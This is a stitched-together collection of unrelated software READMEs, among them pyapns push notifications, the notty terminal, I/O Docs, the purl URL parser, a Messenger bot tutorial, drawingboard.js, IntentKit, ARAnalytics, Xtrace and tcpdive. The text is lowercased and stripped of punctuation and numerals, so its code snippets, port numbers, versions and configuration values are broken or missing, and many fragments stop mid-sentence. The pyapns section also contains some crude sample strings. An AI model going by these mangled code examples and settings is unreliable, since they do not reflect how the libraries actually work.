iansimple through the editor everything is presently just dumped into a single unorganized directory i ll be adding folders and cleaning things up soon remainder of the ian experiments including svhn coming soon i ve integrated the plat interface which makes the npe itself independent of framework so you should be able to run it with blocks tensorflow pytorch pycaffe what have you by modifying the ian class provided in models py this code contains lasagne layers and other goodies adopted from a number of places

native ruby api with rails and rack support and li li scalable fast and easy to distribute behind a proxy and li li based on twisted and li li multi application and dual environment support and li li simplified feedback interface and li sudo easyinstall pyapns pyapns is a service that runs persistently on your machine to start it twistd r epoll web class pyapns server apnsserver port  to get started right away use the included client python from pyapns import configure provision notify provision myapp  open cert pem read  sandbox notify myapp  hexlifiedtokenstr  aps alert hello pyapns supports multiple applications before pyapns can send notifications you must first provision the application with an application id the environment either sandbox or production and the certificate file the provision method takes  arguments appid  pathtocertorcert  environment and timeout a connection is kept alive for each application provisioned for the fastest service possible the application id is an arbitrary identifier and is not used in communication with the apns servers when a connection can not be made within the specified timeout a timeout error will be thrown by the server this usually indicates that the wrong type of certification file is being used a blocked port or the wrong environment attempts to provision the same application id multiple times are ignored calling notify will send the message immediately if a connection is already established the first notification may be delayed a second while the server connects notify takes appid  tokenortokenlist and notificationornotificationlist multiple notifications can be batched for better performance by using paired arrays of token and notifications when performing batched notifications the token and notification arrays must be exactly the same length the full notification dictionary must be included as the notification aps sound flynn caf  badge  message hello from pyapns etc call feedback with the appid a list of tuples will be retrieved from the apns server that it deems inactive these are returned as a list of  element lists with a datetime object and the token string these methods can be called on the server you started the server on be sure you are not including and rpc in the url arguments appid string the application id for the provided certification cert string a path to a pem file or the a string with the entie file environment string the apns server to use either production or sandbox timeout integer timeout for connection attempts to the aps servers returns none

or a single notification dictionary returns none arguments appid string the application id to retrieve retrieve feedback for returns array array datetime timeexpired  string token   pyapns also provides a python api that makes the use of pyapns even simpler the python api must be configured before use but configuration files make it easier the pyapns client module currently supports configuration from django settings and pylons config to configure using django the following must be present in your settings file pyapnsconfig timeout  optional host timeout in seconds initial optional see below craigsfish  and home and samsutch and craigsfish and apscert pem  sandbox  optionally with django settings you can skip manual provisioning by including a list of name path environment tuples that are guaranteed to be provisioned by the time you call notify or feedback configuring for pylons is just as simple but automatic provisioning isn t possible in your configuration file include pyapnstimeout  for explanations of the configuration variables see the docs for pyapns client configure each of these functions can be called synchronously and asynchronously to make them perform asynchronously simply supply a callback and pass async true to the function the request will then be made in another thread and your callback will be executed with the results when calling asynchronously no value will be returned def gotfeedback tuples triminactivetokens tuples feedback myapp  async true callback gotfeedback takes a dictionary of options and configures the client currently configurable options are host  timeout and initial the latter of which is only read once config options host a full host name with port ending with a forward slash timeout an integer specifying how many seconds to timeout a connection to the pyapns server prevents deadlocking the parent thread initial a list of tuples to be supplied to provision when the first configuration happens provisions the appid and initializes a connection to the apns server multiple calls to this function will be ignored by the pyapns daemon but are still sent so pick a good place to provision your apps optimally once arguments appid the appid to provision for apns pathtocertorcert absolute path to the apns ssl cert or a string containing the pem file environment either sandbox or production timeout number of seconds to timeout connection attempts to the apple aps server async pass something truthy to execute the request in a background thread callback a function to be executed with the result errback a function to be executed with the error in case of an error returns none sends push notifications to the apns server multiple notifications can be sent by sending pairing the token and notification arguments in lists token token  notification notification arguments appid provisioned appid to send to tokens token to send the notification or a list of tokens notifications notification dict or a list of notification dicts async pass something truthy to execute the request in a background thread callback a function to be executed with the result when done errback a function to be executed with the error in case of an error returns none retrieves a list of inactive tokens from the apns server and the times it thinks they went inactive arguments appid the appid to query async pass something truthy to execute the request in a background thread callback a function to be executed with the result when feedbacks are done fetching errback a function to be executed with the error if there is one during the request returns list of feedback tuples like datetimeexpired tokenstr  there s python in my ruby this is a class used to send notifications provision applications and retrieve feedback using the apple push notification service pyapns is a multi application aps provider meaning it is possible to send notifications to any number of different applications from the same application and same server it is also possible to scale the client to any number of processes and servers simply balanced behind a simple web proxy it may seem like overkill for such a bare interface after all the aps service is rather simplistic however pyapns takes no shortcuts when it comes to completeness and compliance with the apns protocol and allows the user many optimization and scaling vectors not possible with other libraries no bandwidth is wasted connections are persistent and the server is asynchronous therefore notifications are delivered immediately pyapns takes after the design of rd party push notification service that charge a fee each time you push a notification and charge extra for so called premium service which supposedly gives you quicker access to the aps servers however pyapns is free as in beer and offers more scaling opportunities without the financial draw to add your app to the pyapns server it must be provisioned at least once normally this is done once upon the start up of your application be it a web service desktop application or whatever it must be done at least once to the server you re connecting to multiple instances of pyapns will have to have their applications provisioned individually to provision an application manually use the pyapns client provision method require pyapns client pyapns client configure client provision appid cf  cert and home and ss and cert pem  env sandbox  timeout  this basically says add an app reference named cf to the server and start a connection using the certification and if it can t within  seconds raise a pyapns timeoutexception that s all it takes to get started of course this can be done automatically by using pyapns clientconfiguration middleware pyapns client is a singleton class that is configured using the class method pyapns client configure it is sensibly configured by default but can be customized by specifying a hash see the docs on pyapns clientconfiguration for a list of available configuration parameters some of these are important and you can specify initial applications to be configured by default once your client is configured and application provisioned again these should be taken care of before you write notification code you can begin sending notifications to users if you re wondering how to acquire a notification token you ve come to the wrong place i recommend using google however if you want to send hundreds of millions of notifications to users here s how it s done one at a time the pyapns client notify is a sort of polymorphic method which can notify any number of devices at a time it s basic form is as follows client notify cf  long ass app token  aps alert hello however as stated before it is sort of polymorphic client notify cf  token  token  token  alert alert alert client notify appid cf  tokens mah token  notifications alerthash client notify cf  token  pyapns notification hello tits as you can see the method accepts paralell arrays of tokens and notifications meaning any number of notifications can be sent at once hashes will be automatically converted to pyapns notification objects so they can be optimized for the wire nil values removed etc  and you can pass pyapns notification objects directly if you wish the aps service offers a feedback functionality that allows application servers to retrieve a list of device tokens it deems to be no longer in use and the time it thinks they stopped being useful the user uninstalled your app better luck next time sounds pretty straight forward and it is apple recommends you do this at least once an hour pyapns will return a list of  element lists with the date and the token feedbacks client feedback cf pyapns client will by default perform no funny stuff and operate entirely within the calling thread this means that certain applications may hang when say sending a notification if only for a fraction of a second obviously not a desirable trait all provision  feedback and notify methods also take a block which indicates to the method you want to call pyapns asynchronously and it will be done so handily in another thread calling back your block with a single argument when finished note that notify and provision return absolutely nothing nil for you rub wait you are ruby developers it is probably wise to always use this form of operation so your calling thread is never blocked especially important in ui driven apps and asynchronous servers just pass a block to provision and notify and feedback like so pyapns client instance feedback do and feedbacks and feedbacks each and f and trimtoken f a middleware class to make pyapns client easy to use in web contexts automates configuration of the client in rack environments using a simple confiuration middleware to use pyapns client in rack environments with the least code possible use pyapns clientconfiguration no really in some cases that s all you need middleware with an optional hash specifying the client variables options are as follows use pyapns clientconfiguration port  initial appid myapp  cert and home and myuser and apps and myapp and cert pem  env sandbox  timeout  where the configuration variables are defined host string the host where the server can be found port number the port to which the client should connect initial array optional an array of initial hashes initial hashes appid string the id used to send messages with this certification can be a totally arbitrary value cert string a path to the certification or the certification file as a string env string the environment to connect to apple with always either sandbox or production timoeut number the timeout for the server to use when connecting to the apple servers an apns notification you can construct notification objects ahead of time by using this class however unnecessary it allows you to programmatically generate a notification like so note pyapns notification new alert text   flynn caf  extra guid or note pyapns notification new alert text these can be passed to pyapns client notify the same as hashes
46211416, screenshot png notty is a virtual terminal like xterm gnome vte sh or rxvt unlike these programs notty is not intended to emulate a dec vt series physical video terminal or any other physical device instead notty is an experimental project to bring new features to the command line which would not have been possible for the physical terminals other terminals emulate current command line tools have stagnated if you prefer stabilized around the ecma  and iso  and ansi x  escape code protocol which is defined on the basis of the capabilities of s video terminal devices essentially all terminals in use today are virtual terminals being run on devices which are significantly more capable than these ancient machines and yet the terminal environment has not kept pace with these developments the last revision of the ansi escape code protocol was released in  notty will attempt to remain true to the text oriented command line user interface of the terminal while extending it to include new and more powerful interface features such as full support for rich text formatting including  bits of color full and correct support for all of unicode lossless keyboard input inline media content including raster graphics and structured data dropdown menus tooltips and other features which do not strictly reside in the character grid local echo and retained off screen character grid state to reduce the need for the tty to transmit data back to the terminal subdividing the character grid to enable more complex interface layouts without repeatedly reimplementing that logic in the controlling process and more if you know any features you wish the terminal had please open an issue and let s talk about this many of these features are not yet implemented to achieve these ends notty will implement a new and more consistent escape protocol than ansi escape codes this protocol will be comparatively easy to extend with new features as the project grows once a feature set has been stabilized i will write a framework for creating terminal applications that use notty s features written against this protocol allowing other terminals to implement the protocol and support these features as well this framework will include a polyfill for approximating these features as well as possible in terminals that don t implement notty codes this repository is a library which defines an engine for translating both ansi and notty escape codes into state changes in the terminal s abstract state this library does not directly implement any means of drawing the state to the screen and is agnostic about the interface it uses to communicate with the controlling process so hopefully it will be reusable for writing terminals in different graphical environments for writing screen and tmux like server side multi terminal managers and for writing ssh clients in non unix environments because it implements most ansi escape codes this terminal is backwards compatible with existing command line tools a subdirectory named scaffolding contains a minimal graphical terminal using gtk and pango and cairo intended for testing notty s features interactively this terminal is buggy and feature poor and not intended for general use a major difference between notty and other projects in the same space is that this is just a virtual terminal and is fully backwards compatible with the existing shell and terminal setup it does not implement any features of a shell and it is not attempting to totally supplant any existing paradigms graphical terminals based on this library should be useable as drop in replacements for other terminals but with new features that can be used to implement better interfaces for command line programs such as shells text editors and other utilities that said terminals as they exist today are a pile of ugly kludges from the kernel s tty and pty subsystem to the termios ioctl calls which control it to the terminfo and termcap databases to the ansi escape codes they describe to the ancient codebases of the terminal emulators themselves this is a universe of arcane and poorly documented old growth code much of which is no longer actively useful to people in the st century your system ships with a terminfo db page for more than  different terminal devices nearly all of them extinct and every new console you open has a baud rate set in the kernel even though it exchanges data in memory more advanced features of notty will certainly requiring sidestepping this system to a certain extent the current plan is to implement a command to switch notty to an extended mode in such a mode only notty escape codes would be used and the tty s flags would all be unset except for cread and isig and maybe not even isig this implementation is written in rust

2124683, i and o docs community edition in node js  copyright   mashery inc major change log  numerous schema changes and improvements support for references base paths and authorization moved from apiconfig to api name json files more robust and extensible auth definition block post and put request body capabilities added array type and interface added for use in request body size and order support serialized json support parameter location enhancements placement in the query string path or header method form ui generation driven by alpaca and jquery i and o docs is a live interactive documentation system for restful web apis by defining apis at the resource method and parameter levels in a json schema i and o docs will generate a javascript client interface api calls can be executed from this interface which are then proxied through the i and o docs server with payload data cleanly formatted pretty printed if json or xml basic html text tags are enabled in the json schema however we recommend that you install i and o docs with npm  the node package manager see instructions below build and runtime dependencies   node js server side js engine  npm node package manager  redis key and value storage engine build note if you re not using a package manager node and some of the modules require compiler like gcc if you are on a mac you will need to install xcode if you re on linux you ll need to install build essentials or something equivalent redis note redis is considered a runtime dependency it is used to store oauth information server side if you are not implementing oauth redis is not required you can simply remove the redis block from config json however if you do implement oauth down the road you will need to use redis otherwise you will see  errors during the auth dance installation instructions for node npm redis  installation instructions for i and o docs  from the command line type in cd iodocs npm install these will be automatically installed when you use any of the above npm installation methods above note hashlib is no longer a required module we re using the internal crypto module for signatures and digests running i and o docs  create your config file by copying the default config cp config json sample config json the defaults will work but feel free to change them run a redis instance redis server start i and o docs npm start nix mac osx npm run script startwin windows start i and o docs with a custom config file and nodemodules and bin and supervisor e js and json app config file and config json nix mac osx

854624, purl a javascript url parser v    an amd compatible utility to parse urls and provide easy access to their attributes such as the protocol host port etc  path segments querystring parameters fragment parameters and more note this used to have a jquery dependency this is now optional see below for details license available for use under a mit style license if you need a different license for any reason please just let me know to jquery or not to jquery that is the question  this utility can be used in two ways with jquery or without there is just one file purl js for both versions if jquery is included on the page before it then it will provide the jquery style interface see examples below  otherwise it will be accessible via the global purl variable the jquery version has an additional feature that lets it extract the url from a jquery element object where appropriate specifying the url to parse  there are a few different ways to choose what url to parse javascript and jquery version and var url url and and parse the current page url var url myelement url and and extract the url from the selected element and parse that will work on any element with a src  href or action attribute and plain js version and var url purl and and parse the current page url url attributes  the attr method is used to return information on various parts of the url for example javascript url attr protocol and and returns http url attr path and and returns and folder and dir and index html the attributes available for querying are javascript url attr source url attr protocol url attr host markdown com url attr relative and awesome and language and markdown html show all top url attr path and awesome and language and markdown html url attr directory and awesome and language and url attr file markdown html url attr query show all url attr fragment there are also a few more obscure ones available too if you want to dig about a bit if you don t specify an attribute then this method will return an object literal with all the available attribute key value pairs in it query string parameters  the param method is used to return the values of querystring parameters pass in a string to access that parameter s value javascript and jquery version and and plain js version and if no argument is passed in it will return an object literal containing a key value map of all the querystring parameters javascript and jquery version and and plain js version and note that the param method will work on both ampersand split and semicolon split querystrings as of version   the param method now handles array style query string params url segments  the segment method is used to return values of individual segments from the url s path pass in an integer value to get the value of that segment note however that the count is not zero indexed like an array i e segment  returns the first segment not the second one you can also pass in negative values in which case it will count back from the end of the path rather than forwards from the start javascript url segment  and and returns folder url segment  and and returns example if no argument is passed in it will return an array of all the segments which will be zero indexed javascript fragment parameters and and or segments  there are two methods available for extracting information from fragments of these types fparam and fsegment  both of which behave indentically to their param and segment counterparts but act on the fragment rather than the main url javascript and jquery version and and plain js version and strict mode and relative urls  internally this plugin uses steven levithan s excellent regex uri parser which has two modes loose and strict this plugin uses the loose mode by default i e strict mode set to false  which deviates slightly from the specs but can produce more intuitive results in some situations however loose mode will not correctly parse relative urls so you can optionally enable strict mode when calling the plugin as follows javascript and jquery version and var url url true and and parse the current page url in strict mode var url myelement url true and and extract the url from the selected element and parse that in strict mode and plain js version and var url purl true and and parse the current page url in strict mode a note on improperly encoded urls  if you attempt to use this plugin to parse a url that has an invalid character encoding in it it will throw a urierror exception this will happen if the url has a percentage sign followed by either a non numeric character or a numeric value of greater than  i e  in decimal if there is a chance you may end up parsing a badly encoded url you should probably wrap your calls to this plugin in a try and catch block to prevent this causing unforseen problems older versions and compatability  to run you ll need to have buster installed requires node and npm npm install g buster once it s installed just do cd and path and to and jquery url parser buster static

56199482, alt text and demo and demo gif facebook recently opened up their messenger platform to enable bots to converse with users through facebook apps and on facebook pages so instead here is how to create your own messenger bot in  minutes messenger bots uses a web server to process messages it receives or to figure out what messages to send you also need to have the bot be authenticated to speak with the web server and the bot approved by facebook to speak with the public you can also skip the whole thing by git cloning this repository running npm install and run a server somewhere sudo npm install npm g  create a new folder somewhere and let s create a new node project hit enter to accept the defaults npm init  install the additional node dependencies express is for the server request is for sending out messages and body parser is to process messages npm install express request body parser save  create an index js file in the folder and copy this into it we will start by authenticating the bot javascript use strict const express require express const bodyparser require body parser const request require request const app express app set port  process env port and and  and and process application and x www form urlencoded app use bodyparser urlencoded extended false and and process application and json app use bodyparser json and and index route app get and

8159609, this is a canvas based drawing app that you can integrate easily on your website drawingboard js consists of a blank canvas surrounded by a few ui elements that control it a color picker a pencil a paint can an eraser a pencil size chooser navigations and reset buttons local and session storage are supported your last drawing is restored when you come back on the website you can set a background image at initialization or let the user drop one on the canvas the drawingboard is really lightweight but also really simple if you want something more complete go look at similar projects at the bottom of this doc the board requires jquery since its usage is pretty light it may work as usual if you use zepto but i didn t test it the drawingboard is tied to an html element with an id set the dimensions of the desired board with css on the html element and create it with one line of javascript zbeubeu width px height px var myboard new drawingboard board zbeubeu and script when instantiating the drawingboard you can pass a few options as the nd parameter in an object controls an array containing the list of controls automatically loaded with the board the color  drawingmode  size and navigation controls are loaded by default you can pass an object instead of a string to pass control options ie color  navigation reset false controlsposition define where to put the controls at the top or bottom of the canvas aligned to left and right and center top left by default color the board s pencil color  black by default size the board s pencil size integer  px radius by default background the board s background give an hex and rgb and hsl value for a color false to have nothing transparent board anything else will be seen as an image fff white by default erasercolor color of

enable webstorage support can be session  local or false the drawing is saved in sessionstorage or localstorage and restored when you come back on it session by default droppable do we allow the user to drop an image on the board to draw on it false by default enlargeyourcontainer how should be sized the drawingboard when true  the css width and height will be set on the final board s canvas  ie the drawing zone in the example above that means the board s container will be taller than px because of the controls height if false  the css width and height will be set on the board s container that means the addition of the canvas and the controls will be px high false by default errormessage html string to put in the board s element on browsers that don t support canvas stretchimg default behavior of image setting on the canvas set to the canvas width and height or not false by default a control is a ui element designed to let the user interact with the board change the size and color of the pencil navigate through the drawings history have an eraser button you can pretty much do what you want the drawingboard has a few simple controls loaded by default but you can easily create your own if the given ones don t satisfy you or else drawingboard control color the color picker drawingboard control drawingmode show buttons to draw with the pencil normal mode  the filler the paint can and an eraser you can choose which buttons to show with the options drawingboard control navigation undo redo actions and reset the canvas to blank with  buttons you can choose to show or hide each button individually with options drawingboard control download show a button to download current drawing not loaded by default javascript drawingboard control example drawingboard control extend and and prototype a control has a few attributes and methods name name of the control used to add a class on the div element that will be appended to the drawing board controls container prefixed with

in the gruntfile js file update the concat task by setting all the source files you want the drawingboard works thanks to drawingboard js is a library i built because i couldn t find anything like it in the beginning of  it s really lightweight simple to use and integrate works great on mobile and draws really smooth lines but it misses a few important features and it s not that extendable here are a couple of other tools you can try if the drawingboard doesn t satisfy you drawingboard js is mit licensed license

14815748,  intentkit is an easier way to handle third party url schemes in ios apps linking to third party apps is essentially broken on ios let s say that as a developer you want to allow users to open map links in google maps instead of the built in maps app you now need to write a whole bunch of custom code that determines whether google maps is installed ask the user which they would prefer and ideally remember that preference if we take a more complex example like twitter clients you re now potentially managing a dozen different third party url schemes that are all drastically different and quite possibly poorly documented as a result very few apps link to external third party apps for tasks handled by apple s easier to link to apps even when users prefer third party apps intentkit attempts to solve this problem for users  it provides a beautiful selection interface to choose which third party app to perform an action in for developers  it provides an elegant cohesive api based on semantic actions instead of manually constructing urls or creating modal view controllers to display just tell it what you re trying to do instead of manually checking which applications a user has installed let intentkit automatically query the device for you to figure out what applications are available to perform a given action a unified human readable repository of third party url schemes every application s url scheme is just a plaintext plist you can add support for your application to intentkit without writing a single line of code installation  pod intentkit after running pod install  you should be able to import any inkhandler header file e g import inkmailhandler h and go to town if you re concerned about the increase in your app bundle s size you can choose to only include a subset of intentkit s supported applications subspecs exist for each handler class only includes web browsers pod intentkit and browsers as of ios  apple requires you to whitelist all third party url schemes you plan to use in app this means that using intentkit requires adding all url schemes it might use to your info plist file as an array with the key lsapplicationqueriesscheme for example here s what it looks like to add support for google maps key lsapplicationqueriesschemes and key string comgooglemaps and string string comgooglemaps x callback and string for now you ll have to manually look up which url schemes the intentkit handlers you are using might query check the various plist files nested within the apps folder we recognize that sucks in the future intentkit might provide either a definitive list of which url schemes are necessary per handler or even a way to automate adding this to your info plist intentkit works great in both swift and objective c if you re using swift it s recommended you have the useframeworks option enabled in cocoapods from there just import intentkit or an equivalent subspec from whatever swift file you want to use intentkit in to use intentkit you start by instantiating a handler object there are a handful of handler objects that come with intentkit each with domain knowledge of a specific type of application for example inkbrowserhandler  inkmapshandler  and inktwitterhandler handle opening links in web browsers mapping applications and twitter clients respectively after creating a new handler object you just tell it what action you want to perform it will return you a special object called a presenter which can be used to actually perform the action here s how you d open an email compose screen on an iphone inkmailhandler mailhandler inkmailhandler alloc init mailhandler sendmailto steve apple com presentmodally if the user doesn t have any third party mail apps installed such as mailbox or google s native gmail app  this will display an in line mfmailcomposeviewcontroller  just as if you had created and presented one yourself if the user does have other mail apps installed this will display a modal sheet that looks like a uiactivityviewcontroller listing each available application it will also give them a switch they can tap to remember their choice for all future links of that type depending on your application and userbase that user experience might not be ideal if  of your users want to use the apple default why should they have to go through an extra tap each inkhandler object has an usesystemdefault property if you set it to yes  performing an inkhandler action will not result in a custom ui being shown instead the system will silently pick an application to handle the request sensible defaults are picked for each handler type all handlers that have an apple provided application will use that one and handlers that are based on a third party service e g twitter will default to using the first party application if you use this method of presenting intentkit it s recommended that you give users a way to set their own defaults intentkit provides a view controller called inkdefaultsviewcontroller that lets users set preferences just create a new inkdefaultsviewcontroller object optionally limit which handler types should be displayed and present it on screen inkdefaultsviewcontroller defaultscontroller inkdefaultsviewcontroller alloc init defaultscontroller allowedhandlers inkbrowserhandler class  inkmailhandler class self pushviewcontroller defaultscontroller animated yes when you don t manually limit the handler types it looks something like this if you d rather more control over the user experience intentkit also offers api hooks to set your own defaults every inkhandler object has a prompttosetdefault method that will return an inkactivitypresenter object that handles prompting the user to select an application for even lower level control the inkapplicationlist and inkdefaultsmanager classes can be used to fetch a list of available applications and manually set defaults some handlers have optional configuration parameters for example when linking to a map application you can specify where the map should be centered and how zoomed in it should be these options will take effect whether you re searching for a location getting turn by turn directions or doing any other action supported by the handler inkmapshandler mapshandler inkmapshandler alloc init mapshandler center cllocationcoordinatedmake     mapshandler zoom  mapshandler directionsfrom washington square park to lincoln center this is where the real power of intentkit shines through this gives you a clean semantic api to construct links rather than having to manually cobble together urls regardless of whether your user wants to use apple maps or a third party app an up to date list of available handlers and what methods and configuration options is available in the project s documentation if you re using presentmodally  it will attempt to intelligently figure out which view controller to present itself on it s possible it won t pick the correct one automatically if that s the case you probably want to explicitly specify the correct view controller inkbrowserhandler browserhandler inkbrowserhandler alloc init inkactivitypresenter presenter browserhandler openurl url presenter presentmodalactivitysheetfromviewcontroller self if your app is universal or ipad only if you re displaying an intentkit inkactivityviewcontroller you probably want to display it as a popover instead of a modal sheet the following code will automatically display itself modally on an iphone and in a uipopovercontroller on an ipad inkbrowserhandler browserhandler inkbrowserhandler alloc init inkactivitypresenter presenter browserhandler openurl url presenter presentactivitysheetfromviewcontroller self popoverfromrect somerect inview self view permittedarrowdirections uipopoverarrowdirectionany animated yes all of those options will be passed directly into a uipopovercontroller similarly there exists a presentactivitysheetfromviewcontroller popoverfrombarbuttonitem permittedarrowdirections animated method that calls the equivalent uipopovercontroller method if appropriate if a user doesn t have any appropriate apps installed that can perform an action intentkit will try to use a web browser as a fallback for example if a user tries to do something involving twitter but doesn t have a twitter client installed intentkit will try to load the appropriate twitter com url it does this by presenting an inkbrowserhandler so the user can still pick their preferred web browser if you don t want this behavior you can disable it by setting a handler s usefallback property to no before invoking an action it s worth mentioning that intentkit s default web browser is an in app modal uiwebview this is true both for actions triggered by an inkbrowserhandler and actions triggered by other handlers falling back to a web url if you don t want to do that and would rather fall back on safari for web actions you can set your handler s disableinappoption property to no documentation  alternatively documentation can be found in the docs directory by running script and generate docs sh from the root directory if you do this be aware that the documentation will be generated from your current copy of the code which might differ from the most recent tagged version on cocoapods example project  a demo app has been provided so you can see intentkit in action  clone this repo  run pod install inside the project directory  open example and intentkitdemo xcworkspace  build and run the app the demo lets you perform any of the actions supported by intentkit if you only have one app installed capable of performing a task intentkit will by default open up that app directly rather than prompt the user to pick in the demo app there is a toggle to always show the selection ui if there is at least one application available it s recommended that you run the demo on an actual ios device that has third party apps installed but if you must run it in the simulator that toggle will let you see what the selection ui looks like adding your own actions  extending intentkit is easy  inside the intentkit and apps and directory create a new directory with the name of your app  inside that directory create a plist its name should be the app s english name and its root object should be a dictionary inside this dictionary there should be a name key that represents the app s localized name s if your app s name does not change across locales its value should be a string with that name xml key name and key string safari and string xml key name and key dict key en and key string sina weibo and string key zh hans and key string    and string and dict xml key actions and key dict key searchforlocation and key string comgooglemaps and and q query and string and dict in general the template variable keys are named the same as the argument names of the corresponding handler methods but there is currently nothing enforcing that it s recommended that you look at the plist files for other apps that respond to the same actions to see what the correct template keys are if your application supports actions not currently represented in a handler or is part of a class of applications that doesn t currently have a handler you ll have to write code to add support the current handler code is easy to read refer to an existing handler subclass as a reference for creating your own handler methods or inkhandler subclasses  your app s icon goes in the same directory you will need four copies of the icon all with the same root name as your plist file appname png x appname ipad png x appname x png x appname x ipad png x use the same square icons you re using in your app s xcode project intentkit will take care of masking them so they appear as ios style rounded rectangles and superellipses the root filename appname in those examples must exactly match the filename of the plist  in the root of your intentkit codebase run pod install this will cause xcode to pick up any new files you ve added next run rake to run the test suite which includes a linter to make sure that every action you ve defined in your plist corresponds to a valid handler action you ll also probably want to run the example app on an actual ios device to make sure your links all work as expected  in intentkit podspec  add your app to the subspec that corresponds to the handler your application responds to just add your app s folder name to the list of other application folder names in the appropriate resource bundle file glob  submit a pull request adding your own modal in app action is very similar to adding your own url scheme with a few exceptions all presentable intentkit activities must conform to the inkpresentable protocol which defines two methods one which returns whether or not it can perform a given action and tells it to actually perform an action the latter method is passed a view controller to present your view controller modally on it should both present your view controller and take care of dismissing it once your action is complete a few other changes must be made to your application s intentkit plist file  actions should be an array of action names rather than a dictionary  there should be a field called classname that lists the name of your inkpresententable class  the name field should refer to whatever you want the activity to be listed as inside the app for example inkmailsheet the activity that displays a mfmailcomposeviewcontroller has a name of in app requirements  intentkit requires xcode  targeting ios   and above contributing  all contributions are welcome if you want to help but don t know where to begin adding in support for a new third party application can be a great way to get started it typically doesn t require writing any code the goal of the initial version of intentkit was just to create a simple way to integrate third party app linking without a lot of boilerplate code here s a non exhaustive list of ways it could be extended in to the future downloading and caching plists at runtime allowing an app to pull in the latest url schemes without needing an app store update a web based cms to add and manage url schemes without needing to manually edit plists or submit pull requests saving user app preferences across all applications on a single device that use intentkit optional downloading of app icons from apple at runtime rather than requiring developers to upload them mike walker intentkit is available under the mit license see the license file for more

given an option margintop the element will stop moving vertically upward once the vertical scroll has reached the target position but the element will still move horizontally as the page is scrolled

yandexmobilemetrica adjust appsflyer branch snowplow sentry intercom keen adobe and mobileapptracker and tune and for os x kissmetrics mixpanel and hockeyapp it does this by using cocoapods subspecs to let you decide which libraries you d like to use you are free to also use the official api for any provider too also it comes with an amazing dsl aspect oriented dsl to clear up your methods integration you shouldn t just use pod aranalytics since cocoapods   and you should do something like pod aranalytics  subspecs mixpanel  segmentio  hockeyapp once you ve pod installed d the libraries you can either use the individual for example aranalytics setuptestflightwithteamtoken token methods to start up each individual analytics platform or use the generic setupwithanalytics with our

between lots of providers so it will try to map most of the functionality between providers but if you re doing complex things expect to also use your provider s sdk aspect oriented dsl there is also a dsl like setup constructor in the aranalytics and dsl subspec that lets you do all of your analytics setup at once example usage aranalytics setupwithanalytics and keys and configuration

additionally every view controller will send a page view with its title as the page name whenever viewdidappear is called there are also advanced uses using blocks in the dsl to selectively disable

breadcrumbs to your report and hopefully providing helpful context for your crash reports any messages logged with arlog will also get included in the report note however that on ios syslogd will not

xtrace h to your project s pch file so you can access its methods from anywhere in your project there is a simple category based shortcut interface to start tracing myclass xtrace and and to trace all calls to instances of a class and and this will intercept all methods of any superclasses as well and and but only for instances of the class that has been traced v  instance xtrace and and to trace all calls to a particular instance and and multiple instances can by traced use notrace to stop tracing and and instance tracing takes precedence over class based filtering xtrace tracebundlecontainingclass myclass and and trace your entire app s classes or those of an embedded framework xtrace traceclasspattern ui excluding nil and and trace all of uikit installed you can now color traces by selector class or group of classes as an alternative to building xtrace into your project xtrace is now included once you have injected all xtrace methods are available for you to use

display of method arguments is now on by default but if you have problems xtrace showarguments no you can display the calling function on entry by setting xtrace showcaller yes you should also be able to switch to log the description of all values using xtrace describevalues yes other features are a method name filtering regular expression these filters are applied as the class is swizzled when you request tracing xtrace includemethods a and regular and expression xtrace excludemethods withobjects and and varargs methods don t work xtrace excludetypes cgrect and cgsize and and stack frame

indicator please refer to transmission doc and transmission md transmission image and transmission jpg transmission tcp uses two primary mechanisms to detect and recover from losses fast retransmit triggered by dupacks timeout triggered by timer first is fast retransmit where tcp performs a retransmission of the missing segment after receiving a certain number of duplicate acks as a fall back whenever fast retransmit is unsuccessful or when a sender does not receive enough duplicate acks tcp uses the second mechanism where it waits for a duration of rto before deducing that a segment is lost and then performs retransmission retrans mechanism image and retransmission jpg loss detection and recovery tcpdive can distinguish fast retransmit and timeout figuring out how much time a connection spends on each kind of retransmission mechanism for the meaning of each performance indicator please refer to retransmission doc and retransmission md loss and retransmission image and retransmission jpg loss and retransmission cubic is a tcp congestion control algorithm and the current default in linux as the name of the algorithm represents the window growth function of cubic is a cubic function which consists of three components the first is a concave where the window quickly ramps up to the window size before the last congestion event the middle is a plateau between the concave and convex which allows the window size to stabilize for a period of time the last is the convex where it probes for more bandwidth rapidly tcpdive explores tcp s congestion control mainly through the design and implementation of cubic performance indicators listed below are used to profile cubic for the meaning of each performance indicator please refer to congestion doc and congestion md congestion control image and congestion jpg congestion control what if we want more animate profiling of cubic other than some averaged performance indicators tcpdive supports five kinds of critical points by the use of which we can depict the fluctuation of a connection to figure out what messages a critical point can convey please refer to congestion doc and congestion md advanced congestion control image and congestion jpg advanced congestion control as we all know http is a request response based protocol that means the client will initiate a communication by sending a request and the http server will respond back by sending a response while tcpdive is designed to profile the performance of tcp protocol it can also be used to monitor every http request and response http keep alive is suppported http processing image and http jpg http processing for a pair of http request and response performance indicators listed below are provided http performance indicators image and http jpg http performance indicators tcpdive can profile http processing in some degree as illustrated above note that all the work is done in tcp layer which means it is independent of http applications although no kernel modification is required tcpdive itself is kernel version dependent now tcpdive is developed on kernel       of centos   which is the major system of our production environment more kernel versions will be supported in the future so check your kernel version first for a quick start only systemtap runtime is required to make full use of tcpdive some extra packages are required elfutils systemtap kernel devel kernel debuginfo kernel debuginfo common use rpm command to install gcc elfutils and systemtap if they don t exist kernel debuginfo and kernel debuginfo common packages of this kernel version can be install tcpdive       el   stable x rpm in rpm rpm and modify and usr and bin and tcpdive to change default configuration logname tcpdive log log file name logsize  per log file s upper size mb lognum  max number of log files ports  server ports concerned eg  let s get tcpdive to work tcpdive start and stop and status after running tcpdive start  you will find a log in current directory for every single line in the log it represents a tcp connection which is profiled from multiple dimensions such as transmission loss and retransmission and http processing for the default log format of tcpdive please refer to log doc and log md to make full use of tcpdive some flexible and constomized ways of usage are suggested make sure packages packages are already installed run and tcpdive sh h to see the help information of tcpdive note that there are two kinds of log formats supported check log doc and log md for more details usage and tcpdive sh options modules filters options h show help v show version v verbose mode for debugging t sec stop itself after running specified time m compile as tcpdive ko instead of running directly d

